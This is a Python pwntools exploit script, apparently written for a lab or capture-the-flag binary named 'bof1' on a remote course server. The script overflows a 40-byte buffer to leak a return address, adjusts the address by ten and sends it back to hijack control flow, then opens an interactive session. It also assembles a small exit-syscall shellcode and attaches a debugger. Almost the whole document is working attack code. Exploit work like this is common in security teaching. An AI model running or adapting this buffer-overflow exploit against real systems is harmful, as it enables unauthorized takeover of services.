#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['gnome-terminal', '--']

exe = './bof1'
port = 10257

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

asm_code = """
mov rax, 0x3c
mov rdi, 0x0
syscall
"""

gdb.attach(r, """
print $rsp
""")

sc = asm(asm_code)
print(sc)

"""
r.send(b'A' * 32)
r.recvuntil(b'A' * 32)
address2 = r.recvuntil(b'\n')[:-1].ljust(8, b'\x00')
print(address2)
"""

r.send(b'A' * 40)
r.recvuntil(b'A' * 40)
dynamic_address = r.recvuntil(b'\n')[:-1]
print(dynamic_address)
address = int.to_bytes(int.from_bytes(dynamic_address, 'little') - 10, 8, 'little')
print(address)
r.send(b'A' * 40 + address)
r.interactive()
